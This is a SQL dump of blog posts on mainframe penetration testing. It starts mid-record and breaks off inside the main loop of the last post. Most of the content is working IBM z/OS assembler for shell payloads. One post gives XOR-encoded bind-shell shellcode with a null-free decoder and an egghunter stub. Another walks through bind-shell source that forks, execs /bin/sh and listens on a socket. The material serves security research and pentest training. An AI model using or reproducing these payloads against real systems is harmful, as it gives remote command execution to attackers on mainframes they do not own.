12345CONNADDR DC    XL4\'00000000\'      # address 0.0.0.0BACKLOG  DC    F\'1\'               # 1 byte backlogDOM      DC    A(AF_INET)         # AF_INET = 2TYPE     DC    A(SOCK#_STREAM)    # stream = 1PROTO    DC    A(IPPROTO_IP)      # ip = 0DIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1SRVSKT   DC    16XL1\'77\'          # srv socket structSOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)CLILEN   DC    A(*)               # len of client structCLISKT   DC    16XL1\'88\'          # client socket structCLIFD    DC    A(*)               # client fd************************EXCMD    DC    CL7\'/bin/sh\'       # command to execEXCMDL   DC    A(L\'EXCMD)         # len of cmd to execEXARGC   DC    F\'1\'               # num of argumentsEXARG1   DC    CL2\'sh\'            # arg 1 to execEXARG1L  DC    A(L\'EXARG1)        # len of arg1EXARGL   DC    A(EXARG1)          # addr of argument listEXARGLL  DC    A(EXARG1L)         # addr of arg len listEXENVC   DC    F\'0\'               # env var countEXENVL   DC    F\'0\'               # env var arg list addrEXENVLL  DC    F\'0\'               # env var arg len addrEXITRA   DC    F\'0\'               # exit routine addrEXITPLA  DC    F\'0\'               # exit rout parm list addr*********************RTN_VAL  DC    A(*)               # return valueRTN_COD  DC    A(*)               # return codeRSN_COD  DC    A(*)               # reason code***************************         BPXYSOCK   LIST=YES         # MACRO MAP for socket structure         BPXYFCTL   LIST=YES         # MACRO MAP for fcntl structure         END   @SETUP\r\n					\r\n				\r\n			\r\n		\r\n\r\n \nFull source can be found on github, along with a very small shellcode version.', 'Uncategorized', 'https://www.bigendiansmalls.com/the-reverse-shell/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (35, 'What if pentesting mainframes was easier?', 'bigendiansmalls', '2015-09-15T14:26:40+00:00', 'Here’s a teaser on the talk I’m giving at Derbycon 5.0.   Mainframe Pentesting / Security.   No more excuses.', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/what-if-pentesting-mainframes-was-easier/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, 'Bind Shell – shellcode and source', 'bigendiansmalls', '2015-09-04T08:15:01+00:00', 'This is an addendum to the last post.  Here is shellcode (and it’s stripped down source) that achieve the same goal as the prior post.   The difference is the payload is XOR encoded and the shellcode, and it’s source, have a built in decoder stub that decodes the payload in memory then jumps to it.\nIf the payload decoder coding looks a bit obtuse, it’s because instructions and operands were chosen that have neither nulls “\\x0” nor EBCDIC newlines “\\x15” in them.\nThe code also includes an egghunter that finds the location of the payload in memory, in case they need to be separated.   You can read about egghunters here and here if you aren’t sure what that means.\r\n\r\n		\r\n		\r\n			Decoder/Egghunter Stub (snippet)\r\n			\r\n			\r\n			\n         AFI   1,X\'01010102\'  # loading a 1 in R1\r\n         AFI   2,X\'01010103\'  # loading a 1 in R1\r\n         XR    1,2            # loading a 1 in R1\r\n         LR    4,1            #  will put a 4 in R4\r\n         SLA   4,1(1)         # make R1 == 4\r\n         XR    10,10          # zeroout R10 for our egg\r\n         XR    2,2            # zero 2\r\n         LGFI  10,X\'deadbeef\' # load egghunter value into R10\r\n         LR    11,12          # load  base int R11\r\nLOOPER   AR    11,1           # add 1 to R11\r\n         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0\r\n         CR    10,3           # compare egg with R11 mem pointer\r\n         BRC   7,LOOPER       # branch anything but equal\r\n         AR    11,4\r\n         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0\r\n         CR    10,3           # compare egg with R11 mem pointer\r\n         BRC   7,LOOPER       # 2nd check 2 in a row good to go!\r\n         AR    11,1           # 1 for the offset from above\r\n         SR    11,4           # 4 to skip last egg\r\n         ST    13,4(,11)      # store old SP for later in wkg area\r\n         ST    11,8(,13)      # store this in old wking area\r\n         LR    13,11          # set up R13 pt to new wkg area\r\n** End setup and stack management **\r\n** Begin main decoding routine    **\r\n         LR    3,11           # This is now our egghunter loc\r\n         AR    3,4            # add 4 to 3\r\n         AR    3,4            # R3 points to SC for decoding\r\n         LR    5,3            # R5 points to SC for jumping to\r\n         SR    3,1            # R3-1 to we can XI that addr w/o nulls\r\n         SR    3,1            # R3-1 to we can XI that addr w/o nulls\r\n         LR    4,1            # R4 has static 1\r\n         XR    1,1            # R1 will be our byte counter\r\n         XR    2,2            # R2 will be address pointer\r\nLOOP1    AR    1,4            # add 1 to R1 byte counter\r\n         ARK   2,3,1          # generate new address pointer\r\n* put the XOR key  (enc buffer char) from below in the quotes below\r\n         XI    1(2),X\'4b\'     # xor byte with key\r\n* put the buffer len (num of bytes) in the next cmd in CHI 1,<here>\r\n         CHI   1,2088         # to yield sc len\r\n         BRC   4,LOOP1        # loop bwd 18 bytes if R1 < size\r\n         XR    4,4\r\n** Begin cleanup and stack management **\r\n         L     13,4(4,11)     # reload old SP\r\n         LM    6,4,12(13)     # restore registers\r\n         BCR   15,5           # jmp to sc\r\n** End main decoding routine    **\r\n         DC    X\'DEADBEEF\'     #egg\r\n         DC    X\'DEADBEEF\'     #egg + old sp\r\n*******************************************************************\r\n*Buffer length:      4176\r\n*Number of bytes:    2088\r\n*Enc buffer char:  0x4b\r\n*ASM buffer:\r\n         DC    X\'dba79b478bbbb4b4b4b553448b0b4b4b48af1b9b0b4f539fecd34bX\r\n               4aec834b4fecae487....................\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455\r\n				\r\n						         AFI   1,X\'01010102\'  # loading a 1 in R1         AFI   2,X\'01010103\'  # loading a 1 in R1         XR    1,2            # loading a 1 in R1         LR    4,1            #  will put a 4 in R4         SLA   4,1(1)         # make R1 == 4         XR    10,10          # zeroout R10 for our egg         XR    2,2            # zero 2         LGFI  10,X\'deadbeef\' # load egghunter value into R10         LR    11,12          # load  base int R11LOOPER   AR    11,1           # add 1 to R11         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0         CR    10,3           # compare egg with R11 mem pointer         BRC   7,LOOPER       # branch anything but equal         AR    11,4         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0         CR    10,3           # compare egg with R11 mem pointer         BRC   7,LOOPER       # 2nd check 2 in a row good to go!         AR    11,1           # 1 for the offset from above         SR    11,4           # 4 to skip last egg         ST    13,4(,11)      # store old SP for later in wkg area         ST    11,8(,13)      # store this in old wking area         LR    13,11          # set up R13 pt to new wkg area** End setup and stack management **** Begin main decoding routine    **         LR    3,11           # This is now our egghunter loc         AR    3,4            # add 4 to 3         AR    3,4            # R3 points to SC for decoding         LR    5,3            # R5 points to SC for jumping to         SR    3,1            # R3-1 to we can XI that addr w/o nulls         SR    3,1            # R3-1 to we can XI that addr w/o nulls         LR    4,1            # R4 has static 1         XR    1,1            # R1 will be our byte counter         XR    2,2            # R2 will be address pointerLOOP1    AR    1,4            # add 1 to R1 byte counter         ARK   2,3,1          # generate new address pointer* put the XOR key  (enc buffer char) from below in the quotes below         XI    1(2),X\'4b\'     # xor byte with key* put the buffer len (num of bytes) in the next cmd in CHI 1,<here>         CHI   1,2088         # to yield sc len         BRC   4,LOOP1        # loop bwd 18 bytes if R1 < size         XR    4,4** Begin cleanup and stack management **         L     13,4(4,11)     # reload old SP         LM    6,4,12(13)     # restore registers         BCR   15,5           # jmp to sc** End main decoding routine    **         DC    X\'DEADBEEF\'     #egg         DC    X\'DEADBEEF\'     #egg + old sp********************************************************************Buffer length:      4176*Number of bytes:    2088*Enc buffer char:  0x4b*ASM buffer:         DC    X\'dba79b478bbbb4b4b4b553448b0b4b4b48af1b9b0b4f539fecd34bX               4aec834b4fecae487....................\r\n					\r\n				\r\n			\r\n		\r\n\r\nFull source code on github\nShellcode version', 'Exploit Development, Mainframe, Security, Tips, Uncategorized', 'https://www.bigendiansmalls.com/bind-shell-shellcode-and-source/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, 'Mainframe Bind Shell – Source Code', 'bigendiansmalls', '2015-09-02T07:38:52+00:00', 'Key in any basic toolset for pentesting the mainframe platform is a selection of payloads that can be used to test vulnerabilities.\nBelow is a bind shell payload, written from scratch in mainframe assembler.  The shell can be connected to using netcat. The payload differs from its Intel counterparts, in that it contains its own EBCDIC to ASCII convertor.  Because of this, the standard exec(‘/bin/sh’,’sh’) could not be used.  Read on for more technical details.\n\nUsing the EXEC function causes us to lose control of the STDIN/OUT file descriptors, since we need to translate the character set, this will not work.\nInstead I built it to use a FORK/PIPE combo of function so that each inbound byte (presuming 100% of the testing will be done from an ASCII based platform) is converted to EBCDIC and each outbound byte is converted to ASCII.\nThe full link to the program source code is at the bottom of the post, what follows is a detailed breakdown of the code.\n\nBelow is the setup, pretty standard one that I use when developing quick code tests or full apps.  Essentially it just saves the callers registers, and sets up ours.\n\n\r\n\r\n		\r\n		\r\n			Initial Setup\r\n			Assembly (x86)\r\n			\r\n			\n@SETUP   DS    0F              # full word boundary\r\n         STM   14,12,12(13)    # save our registers\r\n         LARL  15,@SETUP       # base address into R15\r\n         LR    8,15            # copy R15 to R8\r\n         USING @SETUP,8        # R8 for addressability throughout\r\n         LARL  11,SAVEAREA     # sa address\r\n         ST    13,4(,11)       # save caller\'s save area\r\n         LR    13,11           # R13 to our save area\r\n         DS    0H              # halfword boundaries\r\n			\r\n				\r\n					\r\n				\r\n					123456789\r\n				\r\n						@SETUP   DS    0F              # full word boundary         STM   14,12,12(13)    # save our registers         LARL  15,@SETUP       # base address into R15         LR    8,15            # copy R15 to R8         USING @SETUP,8        # R8 for addressability throughout         LARL  11,SAVEAREA     # sa address         ST    13,4(,11)       # save caller\'s save area         LR    13,11           # R13 to our save area         DS    0H              # halfword boundaries\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nNext loads all the addresses of the Assembler Callable Functions we use to execute this program.  They are all stored by name in a data segment beginning at FFUNC address.  This snippet replaces those names with the actual callable memory address.\n\n\r\n\r\n		\r\n		\r\n			Load the function calls\r\n			Assembly (x86)\r\n			\r\n			\n@LOADFS  L     2,FFUNC         # first function we use\r\n         LHI   3,8             # used for our index\r\n         L     4,NUMFUNC       # number of functions to load\r\n@LDLOOP  LR    0,2             # load string of func name\r\n         XR    1,1             # clear R1\r\n         SVC   8               # perform LOAD\r\n         XC    0(8,2),0(2)     # clear current Func space\r\n         ST    0,0(0,2)        # store addr in func space\r\n         AR    2,3             # increment R2 by 8\r\n         AHI   4,-1            # decrement R4\r\n         CIB   4,0,2,@LDLOOP   # compare R4 with 0,if GT loop\r\n***********************************************************************\r\nFFUNC    DC    A(BFRK)          # address of first function\r\nNUMFUNC  DC    F\'11\'            # number of funcs listed below\r\nBFRK     DC    CL8\'BPX1FRK \'    # Fork\r\nBEXC     DC    CL8\'BPX1EXC \'    # Exec\r\nBSOC     DC    CL8\'BPX1SOC \'    # Socket\r\nBBND     DC    CL8\'BPX1BND \'    # Bind\r\nBLSN     DC    CL8\'BPX1LSN \'    # Listen\r\nBACP     DC    CL8\'BPX1ACP \'    # Accept\r\nBRED     DC    CL8\'BPX1RED \'    # Read\r\nBWRT     DC    CL8\'BPX1WRT \'    # Write\r\nBCLO     DC    CL8\'BPX1CLO \'    # Close\r\nBFCT     DC    CL8\'BPX1FCT \'    # Fcntl\r\nBPIP     DC    CL8\'BPX1PIP \'    # Pipe\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122232425\r\n				\r\n						@LOADFS  L     2,FFUNC         # first function we use         LHI   3,8             # used for our index         L     4,NUMFUNC       # number of functions to load@LDLOOP  LR    0,2             # load string of func name         XR    1,1             # clear R1         SVC   8               # perform LOAD         XC    0(8,2),0(2)     # clear current Func space         ST    0,0(0,2)        # store addr in func space         AR    2,3             # increment R2 by 8         AHI   4,-1            # decrement R4         CIB   4,0,2,@LDLOOP   # compare R4 with 0,if GT loop***********************************************************************FFUNC    DC    A(BFRK)          # address of first functionNUMFUNC  DC    F\'11\'            # number of funcs listed belowBFRK     DC    CL8\'BPX1FRK \'    # ForkBEXC     DC    CL8\'BPX1EXC \'    # ExecBSOC     DC    CL8\'BPX1SOC \'    # SocketBBND     DC    CL8\'BPX1BND \'    # BindBLSN     DC    CL8\'BPX1LSN \'    # ListenBACP     DC    CL8\'BPX1ACP \'    # AcceptBRED     DC    CL8\'BPX1RED \'    # ReadBWRT     DC    CL8\'BPX1WRT \'    # WriteBCLO     DC    CL8\'BPX1CLO \'    # CloseBFCT     DC    CL8\'BPX1FCT \'    # FcntlBPIP     DC    CL8\'BPX1PIP \'    # Pipe\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nBelow sets up the pipes (two of them) used to communicate between the parent proc and the child proc.  Each pipe has a read and a write file descriptor.  These will later be used to send bytes to our spawned shell and read the output to pass back to the client.\n\n\r\n\r\n		\r\n		\r\n			Pipes for child proc communications\r\n			Assembly (x86)\r\n			\r\n			\n@CPIPES  LARL  14,@CFD\r\n         BRC   15,LPIPE        # get FDs for child proc\r\n@CFD     ST    5,CFDR          # store child read fd\r\n         ST    6,CFDW          # store child write fd\r\n@CPIPE2  LARL  14,@PFD\r\n         BRC   15,LPIPE        # get FDs for parent proc\r\n@PFD     ST    5,PFDR          # store parent read fd\r\n         ST    6,PFDW          # store parent write fd\r\n			\r\n				\r\n					\r\n				\r\n					12345678\r\n				\r\n						@CPIPES  LARL  14,@CFD         BRC   15,LPIPE        # get FDs for child proc@CFD     ST    5,CFDR          # store child read fd         ST    6,CFDW          # store child write fd@CPIPE2  LARL  14,@PFD         BRC   15,LPIPE        # get FDs for parent proc@PFD     ST    5,PFDR          # store parent read fd         ST    6,PFDW          # store parent write fd\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nOnce the pipes are built, we fork a child process.  Initially the child process has its own copy of the same file descriptors (STDIN,STDOUT,STDERR, etc.) as the parent process.\n\n\r\n\r\n		\r\n		\r\n			Fork the child process\r\n			Assembly (x86)\r\n			\r\n			\nLFORK    L     15,BFRK         # load func addr to 15\r\n         CALL  (15),(CPROCN,RTN_COD,RSN_COD),VL\r\n         BRAS  0,@PREPCHL\r\n         LHI   15,1            # load 1 for RC / Debugging\r\n         L     6,CPROCN        # locad Ret val in R6\r\n			\r\n				\r\n					\r\n				\r\n					12345\r\n				\r\n						LFORK    L     15,BFRK         # load func addr to 15         CALL  (15),(CPROCN,RTN_COD,RSN_COD),VL         BRAS  0,@PREPCHL         LHI   15,1            # load 1 for RC / Debugging         L     6,CPROCN        # locad Ret val in R6\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nA key part of this whole program working is contained below in the line that is “CIB 2,0,7,@PREPPAR”  In this instruction we check the return value from the fork.  Once the fork is complete, the parent process gets the child’s PID (Process ID) as the return value from the fork.   The child PID (which picks up execution in the same program as the parent, just after the fork) gets a 0 as a return code.\n\nUsing this information, we can now code specifically for the child PID or the parent PID by testing the fork return code.\nJust after the CIB instruction (we are executing instructions only in the child process here, the parent jumped to @PREPPAR.  The instructions that follow the CIB then, set up the child’s file descriptors (FD) like this:\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n- The child process inherits both pipes created and all 4 FDs associated (R/W for each)\r\n- Close the WRITE FD on one pipe and the READ FD on the other\r\n- Duplicate the remaining READ FD and point it to the child\'s STDIN\r\n- Duplicate the remaining WRITE FD and point it to the child\'s STDOUT/STDERR\r\n- Close those READ &amp; WRITE PIPE FDs (now that we\'ve dup\'d them)\r\n- The READ FD allows the child to READ what the parent has sent\r\n- The WRITE FD allows the child to WRITE back to the parent\r\n			\r\n				\r\n					\r\n				\r\n					1234567\r\n				\r\n						- The child process inherits both pipes created and all 4 FDs associated (R/W for each)- Close the WRITE FD on one pipe and the READ FD on the other- Duplicate the remaining READ FD and point it to the child\'s STDIN- Duplicate the remaining WRITE FD and point it to the child\'s STDOUT/STDERR- Close those READ &amp; WRITE PIPE FDs (now that we\'ve dup\'d them)- The READ FD allows the child to READ what the parent has sent- The WRITE FD allows the child to WRITE back to the parent\r\n					\r\n				\r\n			\r\n		\r\n\r\n\r\n\r\n		\r\n		\r\n			Setup child file descriptors\r\n			Assembly (x86)\r\n			\r\n			\n@PREPCHL L     2,CPROCN        # load child proc # to R2\r\n         CIB   2,0,7,@PREPPAR  # R2 not 0? We\'re parent, move on\r\n         LARL  14,@PRC1\r\n         LA    2,F_CLOSFD\r\n         L     5,PFDW          # load R5 with pfdw\r\n         L     6,PFDW          # load R5 with pfdw\r\n@PRC0    BRC   15,LFCNTL       # call close\r\n@PRC1    LARL  14,@PRC2\r\n         LA    2,F_CLOSFD\r\n         L     5,CFDR          # load R5 with cfdr\r\n         L     6,CFDR          # load R5 with cfdr\r\n         BRC   15,LFCNTL       # call close\r\n@PRC2    LARL  14,@PRC3\r\n         LA    2,F_DUPFD2      # gonna do a dup2\r\n         L     5,PFDR          # parent read fd\r\n         LGFI  6,0             # std input\r\n         BRC   15,LFCNTL       # call dupe2\r\n@PRC3    LARL  14,@PRC4\r\n         LA    2,F_DUPFD2      # gonna do a dup2\r\n         L     5,CFDW          # child write fd\r\n         LGFI  6,1             # std output\r\n         BRC   15,LFCNTL       # call dupe2\r\n@PRC4    LARL  14,@PRC5        # if 0 we are in child pid, goto exec\r\n         LA    2,F_DUPFD2      # gonna do a dup2\r\n         L     5,CFDW          # child write fd\r\n         LGFI  6,2             # std error\r\n         BRC   15,LFCNTL       # call dupe2\r\n@PRC5    LARL  14,@PRC6\r\n         LA    2,F_CLOSFD\r\n         L     5,PFDR          # load R5 with pfdr\r\n         L     6,PFDR          # load R5 with pfdr\r\n         BRC   15,LFCNTL       # call close\r\n@PRC6    LARL  14,@PRC7\r\n         LA    2,F_CLOSFD\r\n         L     5,CFDW          # load R5 with cfdw\r\n         L     6,CFDW          # load R5 with cfdw\r\n         BRC   15,LFCNTL       # call close\r\n@PRC7    BRAS  0,LEXEC\r\n			\r\n				\r\n					\r\n				\r\n					1234567891011121314151617181920212223242526272829303132333435363738\r\n				\r\n						@PREPCHL L     2,CPROCN        # load child proc # to R2         CIB   2,0,7,@PREPPAR  # R2 not 0? We\'re parent, move on         LARL  14,@PRC1         LA    2,F_CLOSFD         L     5,PFDW          # load R5 with pfdw         L     6,PFDW          # load R5 with pfdw@PRC0    BRC   15,LFCNTL       # call close@PRC1    LARL  14,@PRC2         LA    2,F_CLOSFD         L     5,CFDR          # load R5 with cfdr         L     6,CFDR          # load R5 with cfdr         BRC   15,LFCNTL       # call close@PRC2    LARL  14,@PRC3         LA    2,F_DUPFD2      # gonna do a dup2         L     5,PFDR          # parent read fd         LGFI  6,0             # std input         BRC   15,LFCNTL       # call dupe2@PRC3    LARL  14,@PRC4         LA    2,F_DUPFD2      # gonna do a dup2         L     5,CFDW          # child write fd         LGFI  6,1             # std output         BRC   15,LFCNTL       # call dupe2@PRC4    LARL  14,@PRC5        # if 0 we are in child pid, goto exec         LA    2,F_DUPFD2      # gonna do a dup2         L     5,CFDW          # child write fd         LGFI  6,2             # std error         BRC   15,LFCNTL       # call dupe2@PRC5    LARL  14,@PRC6         LA    2,F_CLOSFD         L     5,PFDR          # load R5 with pfdr         L     6,PFDR          # load R5 with pfdr         BRC   15,LFCNTL       # call close@PRC6    LARL  14,@PRC7         LA    2,F_CLOSFD         L     5,CFDW          # load R5 with cfdw         L     6,CFDW          # load R5 with cfdw         BRC   15,LFCNTL       # call close@PRC7    BRAS  0,LEXEC\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nPipes set up; now a shell can be exec’d.  This process will inherit the FDs we just create, it’s STDIN,OUT,ERR mapped to the parent PID via pipes.\n\n\r\n\r\n		\r\n		\r\n			Launch shell in child process\r\n			Assembly (x86)\r\n			\r\n			\nLEXEC    L     15,BEXC         # load func addr to 15\r\n         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x\r\n               EXENVC,EXENVLL,EXENVL,                                  x\r\n               EXITRA,EXITPLA,                                         x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n         BRAS  0,GOODEX        # exit child proc after exec\r\n			\r\n				\r\n					\r\n				\r\n					123456\r\n				\r\n						LEXEC    L     15,BEXC         # load func addr to 15         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x               EXENVC,EXENVLL,EXENVL,                                  x               EXITRA,EXITPLA,                                         x               RTN_VAL,RTN_COD,RSN_COD),VL         BRAS  0,GOODEX        # exit child proc after exec\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nThis section is where the parent PID jumps after the fork and CIB stmt in step 5 above.  Here we also groom our pipe FDs, closing the READ FD on the pipe that corresponds with the WRITE FD closed by the child initially.  Also, close the WRITE FD on the same pipe as the READ FD the child closed initially.  This is by far the most confusing part of the whole setup.\n\n\r\n\r\n		\r\n		\r\n			Prepare parent pid for communication\r\n			Assembly (x86)\r\n			\r\n			\n@PREPPAR LARL  14,@PRP1\r\n         LA    2,F_CLOSFD\r\n         L     5,PFDR          # load R5 with pfdr\r\n         L     6,PFDR          # load R5 with pfdr\r\n         BRC   15,LFCNTL       # call close\r\n@PRP1    LARL  14,LSOCK\r\n         LA    2,F_CLOSFD\r\n         L     5,CFDW          # load R5 with cfdw\r\n         L     6,CFDW          # load R5 with cfdw\r\n         BRC   15,LFCNTL       # call close\r\n			\r\n				\r\n					\r\n				\r\n					12345678910\r\n				\r\n						@PREPPAR LARL  14,@PRP1         LA    2,F_CLOSFD         L     5,PFDR          # load R5 with pfdr         L     6,PFDR          # load R5 with pfdr         BRC   15,LFCNTL       # call close@PRP1    LARL  14,LSOCK         LA    2,F_CLOSFD         L     5,CFDW          # load R5 with cfdw         L     6,CFDW          # load R5 with cfdw         BRC   15,LFCNTL       # call close\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nHere are the Socket,Bind,Listen and Accept calls that are pretty standard, if you’ve done any socket work, this will look very familiar.  At the end of the accept call, the machine is listening on the port you specific and waiting for a connection from the client.\n\n\r\n\r\n		\r\n		\r\n			Create socket,bind,listen,accept\r\n			Assembly (x86)\r\n			\r\n			\nLSOCK    L     15,BSOC         # load func addr to 15\r\n         CALL  (15),(DOM,TYPE,PROTO,DIM,SRVFD,                         x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n***********************************************************************\r\nLBIND    L     15,BBND                      # load func addr to 15\r\n         LA    5,SRVSKT                     # addr of our socket\r\n         USING SOCKADDR,5                   # layout sockaddr over R5\r\n         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct\r\n         MVI   SOCK_FAMILY,AF_INET          # family inet\r\n         MVI   SOCK_LEN,SOCK#LEN            # len of socket\r\n         MVC   SOCK_SIN_PORT,LISTSOCK       # list on PORT 12345\r\n         MVC   SOCK_SIN_ADDR,LISTADDR       # listen on 0.0.0.0\r\n         DROP  5\r\n         CALL  (15),(SRVFD,SOCKLEN,SRVSKT,                             x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n***********************************************************************\r\nLLIST    L     15,BLSN          # load func addr to 15\r\n         CALL  (15),(SRVFD,BACKLOG,                                    x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n***********************************************************************\r\nLACPT    L     15,BACP         # load func addr to 15\r\n         LA    5,CLISKT        # addr of our socket address\r\n         USING SOCKADDR,5      # set up addressing for sock struct\r\n         XC    SOCKADDR(8),SOCKADDR        #zero sock addr struct\r\n         MVI   SOCK_FAMILY,AF_INET\r\n         MVI   SOCK_LEN,(SOCK#LEN+SOCK_SIN#LEN)\r\n         DROP  5\r\n         CALL  (15),(SRVFD,CLILEN,CLISKT,                              x\r\n               CLIFD,RTN_COD,RSN_COD),VL\r\n			\r\n				\r\n					\r\n				\r\n					1234567891011121314151617181920212223242526272829\r\n				\r\n						LSOCK    L     15,BSOC         # load func addr to 15         CALL  (15),(DOM,TYPE,PROTO,DIM,SRVFD,                         x               RTN_VAL,RTN_COD,RSN_COD),VL***********************************************************************LBIND    L     15,BBND                      # load func addr to 15         LA    5,SRVSKT                     # addr of our socket         USING SOCKADDR,5                   # layout sockaddr over R5         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct         MVI   SOCK_FAMILY,AF_INET          # family inet         MVI   SOCK_LEN,SOCK#LEN            # len of socket         MVC   SOCK_SIN_PORT,LISTSOCK       # list on PORT 12345         MVC   SOCK_SIN_ADDR,LISTADDR       # listen on 0.0.0.0         DROP  5         CALL  (15),(SRVFD,SOCKLEN,SRVSKT,                             x               RTN_VAL,RTN_COD,RSN_COD),VL***********************************************************************LLIST    L     15,BLSN          # load func addr to 15         CALL  (15),(SRVFD,BACKLOG,                                    x               RTN_VAL,RTN_COD,RSN_COD),VL***********************************************************************LACPT    L     15,BACP         # load func addr to 15         LA    5,CLISKT        # addr of our socket address         USING SOCKADDR,5      # set up addressing for sock struct         XC    SOCKADDR(8),SOCKADDR        #zero sock addr struct         MVI   SOCK_FAMILY,AF_INET         MVI   SOCK_LEN,(SOCK#LEN+SOCK_SIN#LEN)         DROP  5         CALL  (15),(SRVFD,CLILEN,CLISKT,                              x               CLIFD,RTN_COD,RSN_COD),VL\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nAfter the initial connection is made, we are going set the Client socket FD and the FD used to read from the child process to non-blocking.  Doing so allows us to monitor both quickly, allowing near instantaneous response and long interactions.\n\n\r\n\r\n		\r\n		\r\n			Set certain file descriptors to non-blocking\r\n			Assembly (x86)\r\n			\r\n			\n@SNB1    LARL  14,@SNB2\r\n         LA    2,F_GETFL       # get file status flags\r\n         L     5,CLIFD         # client sock fd\r\n         XR    6,6             # for getfd, arg is 0\r\n         BRC   15,LFCNTL       # call dupe2\r\n@TFLAG   DC    F\'0\'\r\n@SNB2    ST    7,@TFLAG        # R7 will have our flags\r\n         LA    5,O_NONBLOCK    # add non-blocking flag\r\n         OR    7,5             # or to add the flag to R7\r\n         LARL  14,@SNB3\r\n         LA    2,F_SETFL       # set file status flags\r\n         L     5,CLIFD         # client sock fd\r\n         LR    6,7             # put new flags in R6\r\n         BRC   15,LFCNTL       # call dupe2\r\n@SNB3    LARL  14,@SNB4\r\n         LA    2,F_GETFL       # get file status flags\r\n         L     5,CFDR          # child fd read\r\n         XR    6,6             # for getfd, arg is 0\r\n         BRC   15,LFCNTL       # call dupe2\r\n@SNB4    ST    7,@TFLAG        # R7 will have our flags\r\n         LA    5,O_NONBLOCK    # add non-blocking flag\r\n         OR    7,5             # or to add the flag to R7\r\n         LARL  14,@READCLI     # when we ret, enter main loop\r\n         LA    2,F_SETFL       # set file status flags\r\n         L     5,CFDR          # child fd read\r\n         LR    6,7             # put new flags in R6\r\n         BRC   15,LFCNTL       # call dupe2\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627\r\n				\r\n						@SNB1    LARL  14,@SNB2         LA    2,F_GETFL       # get file status flags         L     5,CLIFD         # client sock fd         XR    6,6             # for getfd, arg is 0         BRC   15,LFCNTL       # call dupe2@TFLAG   DC    F\'0\'@SNB2    ST    7,@TFLAG        # R7 will have our flags         LA    5,O_NONBLOCK    # add non-blocking flag         OR    7,5             # or to add the flag to R7         LARL  14,@SNB3         LA    2,F_SETFL       # set file status flags         L     5,CLIFD         # client sock fd         LR    6,7             # put new flags in R6         BRC   15,LFCNTL       # call dupe2@SNB3    LARL  14,@SNB4         LA    2,F_GETFL       # get file status flags         L     5,CFDR          # child fd read         XR    6,6             # for getfd, arg is 0         BRC   15,LFCNTL       # call dupe2@SNB4    ST    7,@TFLAG        # R7 will have our flags         LA    5,O_NONBLOCK    # add non-blocking flag         OR    7,5             # or to add the flag to R7         LARL  14,@READCLI     # when we ret, enter main loop         LA    2,F_SETFL       # set file status flags         L     5,CFDR          # child fd read         LR    6,7             # put new flags in R6         BRC   15,LFCNTL       # call dupe2\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\nThis is the main loop of the program.  Initially it perpetually reads from the client socket, waiting for input.  Once input is received, it converts that input byte by byte from ASCII to EBCDIC.  The EBCDIC bytes are then written to the child process via one of our pipes.  After a write, the child process is read until there is no more output waiting.\n\nBytes read from the child process (output from our shell) are converted back to ASCII and written to the client’s socket, then the loop carries on.\r\n\r\n		\r\n		\r\n			Main read/write loop\r\n			Assembly (x86)\r\n			\r\n			\n@READCLI L     5,CLIFD         # read from CLIFD\r\n         LA    7,@READCFD      # Nothing read, return to here\r\n         LARL  14,@A2E1        # Bytes read, return to here\r\n         BRC   15,LREAD        # Brach to read function\r\n***********************************************************************\r\n@A2E1    LARL  14,@CCW1        # load return area in r14\r\n         BRC   15,CONVAE       # call e2a func\r\n@CCW1    LARL  14,@READCFD     # after write, read child fd\r\n         L     5,PFDW          # write to child process fd\r\n         BRC   15,LWRITE       # call write function\r\n***********************************************************************\r\n@READCFD L     5,CFDR          # read from child fd\r\n         LA    7,@READCLI      # nothing read, back to socket read\r\n         LARL  14,@E2A1        # Bytes read, return to here\r\n         BRC   15,LREAD        # Branch to read function\r\n***********************************************************************\r\n@E2A1    LARL  14,@CCW2        # load return area in r14\r\n         BRC   15,CONVEA       # call e2a func\r\n@CCW2    LARL  14,@READCFD     # loop read child proc fd after write\r\n         L     5,CLIFD         # write to client socked fd\r\n         BRC   15,LWRITE       # call write function\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021\r\n				\r\n						@READCLI L     5,CLIFD         # read from CLIFD         LA    7,@READCFD      # Nothing read, return to here         LARL  14,@A2E1        # Bytes read, return to here         BRC   15,LREAD        # Brach to read function***********************************************************************@A2E1    LARL  14,@CCW1        # load return area in r14         BRC   15,CONVAE       # call e2a func@CCW1    LARL  14,@READCFD     # after write, read child fd         L     5,PFDW          # write to child process fd         BRC   